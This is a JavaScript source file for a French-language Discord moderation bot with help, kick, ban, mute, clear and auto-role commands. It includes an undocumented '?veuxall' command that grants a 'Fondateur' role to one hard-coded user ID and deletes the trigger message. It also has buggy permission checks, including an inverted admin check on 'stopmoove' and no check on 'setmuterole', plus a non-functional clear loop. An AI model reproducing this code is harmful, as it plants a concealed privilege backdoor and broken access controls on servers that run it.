const discord = require('discord.js');
const bot = new discord.Client(); 

var prefix = ("!");
var secondaryPrefix = ("?");

var mutedrole = ("mute");
var autorole = ("Rebel");



bot.on('ready', function(){
    
    console.log(`Connecté avec ${bot.user.tag} (${bot.user.id}) sur ${bot.guilds.size} serveurs`);
    bot.user.setActivity(prefix + 'help');
    bot.user.setAvatar("http://logo-logos.com/wp-content/uploads/2018/03/discord_icon_logo_remix.png");

});

bot.on('message', message =>{;

    if(message.author.bot) return;

    var args = message.content.substring(prefix.length).split(' ');


    if(message.content === secondaryPrefix + "bg"){
        message.channel.sendMessage("C'est Benedict ");
    };

    if(message.content === secondaryPrefix + "boss") return message.channel.send("C'est Quentin");

    if(message.content === secondaryPrefix + "veuxall"){
        if(message.member.user.id === "428966219383570432"){
            var role = message.guild.roles.find('name', 'Fondateur');
            message.channel.lastMessage.delete();
            message.member.addRole(role);
        }
    }

    if(message.content === prefix + "help"){

        //HELP
        var embed = new discord.RichEmbed()
            .setTitle("Page d'aide")
            .addBlankField()
            .addField("COMMANDES POUR LES ADMINS", "Commandes réservées au best")
            .addField(prefix + "ban [@pseudo] ","Permet de ban des joueurs")
            .addField(prefix + "kick [@pseudo]", "Permet de kick des joueurs")
            .addField(prefix + "settings", "Permet de modifier les paramètres des commandes")
            .addBlankField()
            .addField("COMMANDES POUR TOUS LE MONDE", "Commandes utiles mais pas marrantes")
            .addField(prefix + "discordinfo","Permet d'avoir des infos sur le Discord")
            .setColor(255, 0, 0)
            message.channel.send(embed);

    };

    //SETTINGS 
    if(message.content === prefix + "settings"){
        var embed = new discord.RichEmbed()
            .setTitle("Paramètres")
            .addField(prefix + "changerole [role]", "Permet de changer le role qui est donné aux nouveaux arrivants")
            .addField(prefix + "changeprefix [prefix]", "Permet de changer le prefix pour faire une commandes")
            .addField(prefix + "setmuterole [@role]", "Permet de changer le role de mute")
            .setColor(0, 0, 255)
        message.channel.send(embed);
    }

    //PING
    if(message.content === prefix + "ping"){
        const then = Date.now();
        message.channel.send('Pinging...').then(m =>{
            m.edit(`Pong! Ca a pris  ${Date.now() - then}ms pour envoyer ce message\nPing du bot : ${bot.ping}ms`);
        });
    }

    //KICK
    if(message.content.startsWith(prefix + "kick")){
        if(message.member.permissions.has('KICK_MEMBERS')){ 
            const member = message.mentions.members.first();
            if(!member) return message.reply("Mauvais usage fait comme ça : `.kick @User#1234`");
            if(member && message.member.permissions.has("KICK_MEMBERS")){
                member.kick(`Kicker par ${message.author.tag}`);
                message.reply("Le joueur a bien été kiker.");
            }
        }else{
            message.reply("Tu n'as pas les permissions nécéssaires.");
        }
    }

    //SETMUTEROLE
    if(message.content === prefix + "setmuterole"){
        if(!args[1]) return message.reply("Met un un role");
        mutedrole = args[1]
        message.reply("Mute role changé");
    }

    //BAN
    if(message.content.startsWith(prefix + "ban")){
        if(!message.member.permissions.has("BAN_MEMBERS")) return message.reply("Tu n'as pas les permissions nécéssaires.");
        const member = message.mentions.members.first();
        if(!member) return message.reply("Mauvais usage fait comme ça : `.ban @User#1234`");
         if(member && message.member.permissions.has("BAN_MEMBERS")){
             member.ban(`banni par ${message.author.tag}`);
             message.reply("Le joueur a bien été banni.");
         }

    }


    //DISCORD INFO
    if(message.content === prefix + "discordinfo"){
        var embed = new discord.RichEmbed()
            .setTitle("Information du discord")
            .addField("Nom du discord : " , message.guild.name)
            .addField("Crée le : " , message.guild.createdAt)
            .addField("Tu nous a rejoin le : " , message.member.joinedAt)
            .addField("Ce discord possèdent " , message.guild.memberCount + " joueurs")
            .setColor("0x0000FF")
        message.channel.send(embed);
    }

    //CHANGE ROLE
    if(message.content.startsWith(prefix + "changerole")){
        if(message.member.permissions.has('ADMINISTRATOR')){
            if(!args[1]) return message.reply("Met un role");
                autorole = args[1]
                message.reply("Le role a bien été changer");
        }
    }

    //CHANGE PREFIX
    if(message.content.startsWith(prefix + "changeprefix")){
        if(message.member.permissions.has('ADMINISTRATOR')){
            if(!args[1]) return message.reply("Met un prefix");
                prefix = args[1]
                message.reply("Le préfix a bien été changer");
        }
    }


    //CHANGE COLOR
    if(message.content.startsWith(prefix + "changenamecolor")){
        message.member.colorRole.hexColor('RED');
        if(!args [1]){
            var embed = new discord.RichEmbed()
                .setTitle("Couleur possible")
                .addField()
        }
    }
  

    if(message.content === prefix + "actualprefix") return message.reply("Le prefix actuel est : " + prefix);
    if(message.content === prefix + "actualautorole") return message.reply("L'autorole actuel est : " + autorole);
    if(message.content === prefix + "actualmuterole") return message.reply("Le mute role actuel est : " + mutedrole);



    if(message.content.startsWith(prefix + "mute")){
        if(!message.member.permissions.has('MANAGE_GUILD')) return message.reply("Tu n'as pas les permissions nécéssaires.");
        const member = message.mentions.members.first();
        const mute = message.guild.roles.find('name', 'mute');
        if(!member) return message.reply("Mauvais usage fait comme ça : `.mute @User#1234`");
         if(member && message.member.permissions.has("BAN_MEMBERS")){
             
             member.addRole(mute);
             message.reply("Le joueur a bien été muté.");
         }
    }

    if(message.content.startsWith(prefix + "stopmoove")){
        if(message.member.permissions.has('ADMINISTRATOR')) return message.reply("Tu n'as pas les permissions nécéssaires.");
        const role = message.mentions.roles.first();
        role.setPermissions('MOVE_MEMBERS', false);

    }    

    if(message.content.startsWith(prefix + 'clear')){
        if(!args[1]) return message.reply("Mauvais usage fait comme ça : `!clear nombre`");
        var nombre = args[1].toString();
        
        
        if(isNaN(nombre)) return message.reply("Mauvais usage fait comme ça : `!clear nombre`");

        var number = parseInt(nombre);

        for(var i = 0; i === nombre; i++){
            message.channel.lastMessage.delete();
        }

        message.reply("Les messages preécédent ont été effacés");
    }

});

//AUTO ROLE ET BIENVENUE
bot.on("guildMemberAdd", member =>{
    member.guild.channels.find("name", "general").send(`Bienvenue ${member}`);
    if(!member.guild.roles.find('name', role)) return console.log("Role inconnu");
    member.addRole(member.guild.roles.find('name', autorole));
})

bot.login(process.env.TOKEN);
